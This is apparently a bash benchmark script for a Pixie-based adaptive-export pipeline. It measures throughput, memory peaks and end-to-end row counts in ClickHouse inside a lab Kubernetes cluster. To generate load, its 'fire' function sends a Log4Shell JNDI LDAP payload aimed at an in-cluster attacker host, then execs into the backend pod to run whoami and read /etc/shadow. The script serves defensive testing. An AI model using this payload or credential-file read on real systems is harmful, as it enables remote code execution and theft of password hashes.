#!/usr/bin/env bash

# Copyright 2018- The Pixie Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

# nfr.sh — AE non-functional benchmark: throughput, AE+dx mem under load, and
# END-TO-END no-data-loss proof (broker read_count == AE wrote_count == ACTUAL CH rows).
# Two phases: passthrough (firehose, throughput stress) then streaming (DX). Node-side on rig.
set -uo pipefail
NS=log4j-poc; CHPOD=chi-forensic-soc-db-soc-cluster-0-0-0
DUR=${DUR:-150}
OUT=/tmp/nfr.txt; : > "$OUT"
chq(){ kubectl -n clickhouse exec "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
say(){ echo "[$(date -u +%H:%M:%S)] $*" | tee -a "$OUT"; }
BIP=$(kubectl -n $NS get svc backend -o jsonpath='{.spec.clusterIP}'); BPORT=$(kubectl -n $NS get svc backend -o jsonpath='{.spec.ports[0].port}')
fire(){ kubectl -n attacker-ns exec deploy/attacker -- curl -s -m4 -A '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}' "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true
  local BP; BP=$(kubectl -n $NS get pods --no-headers 2>/dev/null|awk '/^backend/{print $1;exit}')
  [ -n "$BP" ] && kubectl -n $NS exec "$BP" -- sh -c 'whoami; cat /etc/shadow 2>/dev/null|head -1; getent hosts attacker.attacker-ns.svc.cluster.local >/dev/null 2>&1' >/dev/null 2>&1 || true; }
memsum(){ kubectl -n "$1" top pod -l "$2" --no-headers 2>/dev/null | awk '{gsub(/Mi/,"",$3); s+=$3} END{print s+0}'; }
truncate_all(){ local t; for t in http_events dns_events conn_stats pgsql_events ae_reconcile adaptive_attribution kubescape_logs; do chq "TRUNCATE TABLE IF EXISTS forensic_db.\`$t\`" >/dev/null 2>&1; done; }
setarm(){ kubectl -n pl set env ds/adaptive-export "$@" ADAPTIVE_RECONCILE=true >/dev/null 2>&1; kubectl -n pl rollout status ds/adaptive-export --timeout=150s >/dev/null 2>&1; }

run_phase(){ local name=$1; shift
  say "=== PHASE $name : $* ==="
  setarm "$@"; truncate_all; say "  truncated; $name load window ${DUR}s"
  local t0 aemax=0 dxmax=0 pemmax=0 sm=0
  t0=$(date +%s)
  while [ $(( $(date +%s) - t0 )) -lt "$DUR" ]; do
    fire
    local ae dx pem; ae=$(memsum pl 'name=adaptive-export'); dx=$(memsum honey 'app=dx-daemon'); pem=$(memsum pl 'name=vizier-pem')
    [ "${ae:-0}" -gt "$aemax" ] && aemax=$ae; [ "${dx:-0}" -gt "$dxmax" ] && dxmax=$dx; [ "${pem:-0}" -gt "$pemmax" ] && pemmax=$pem
    sm=$((sm+1)); sleep 12
  done
  local el; el=$(( $(date +%s) - t0 )); say "  window done ${el}s ($sm samples); flush 20s"; sleep 20
  say "  [MEM peak] AE(2pods)=${aemax}Mi  dx-daemon=${dxmax}Mi  PEM=${pemmax}Mi"
  say "  [NO-LOSS PROOF] broker_read == AE_wrote == CH_actual_rows:"
  local t rd wr ch
  for t in http_events dns_events conn_stats; do
    rd=$(chq "SELECT sum(read_count) FROM forensic_db.ae_reconcile WHERE table_name='$t'"); rd=${rd:-0}
    wr=$(chq "SELECT sum(wrote_count) FROM forensic_db.ae_reconcile WHERE table_name='$t'"); wr=${wr:-0}
    ch=$(chq "SELECT count() FROM forensic_db.$t"); ch=${ch:-0}
    say "    $t: read=$rd wrote=$wr CH_rows=$ch  $([ "$wr" = "$ch" ] && echo 'MATCH' || echo '*MISMATCH*')$([ "$rd" = "$wr" ] && echo '/read==wrote' || echo '/READ!=WROTE')"
  done
  say "  [BYTES] per-table rows + compressed bytes (on-disk data volume):"
  chq "SELECT '    '||table, sum(rows), sum(data_compressed_bytes) FROM system.parts WHERE database='forensic_db' AND active AND table IN ('http_events','dns_events','conn_stats') GROUP BY table ORDER BY table FORMAT TSV" | tee -a "$OUT"
  local tot; tot=$(chq "SELECT count() FROM forensic_db.http_events"); tot=$((tot + $(chq "SELECT count() FROM forensic_db.dns_events") + $(chq "SELECT count() FROM forensic_db.conn_stats")))
  say "  [THROUGHPUT] $name CH rows=$tot over ${el}s = $(awk -v r=$tot -v e=$el 'BEGIN{printf "%.1f", r/e}') rows/s"
  say "  [steered] $(chq "SELECT arrayStringConcat(groupArray(pod),',') FROM (SELECT DISTINCT pod FROM forensic_db.adaptive_attribution WHERE t_end>now())")"
}

say "##### AE NFR BENCHMARK START #####"
run_phase ALL-passthrough ADAPTIVE_PASSTHROUGH=true ADAPTIVE_WRITE_MODE= ADAPTIVE_PUSH_PIXIE_ROWS=false ADAPTIVE_PASSTHROUGH_WINDOW_SEC=60 ADAPTIVE_PASSTHROUGH_REFRESH_SEC=60
run_phase DX-streaming ADAPTIVE_PASSTHROUGH=false ADAPTIVE_WRITE_MODE=streaming ADAPTIVE_PUSH_PIXIE_ROWS=false ADAPTIVE_STREAM_WINDOW_SEC=60 ADAPTIVE_STREAM_REFRESH_SEC=60
say "##### NFR DONE #####"
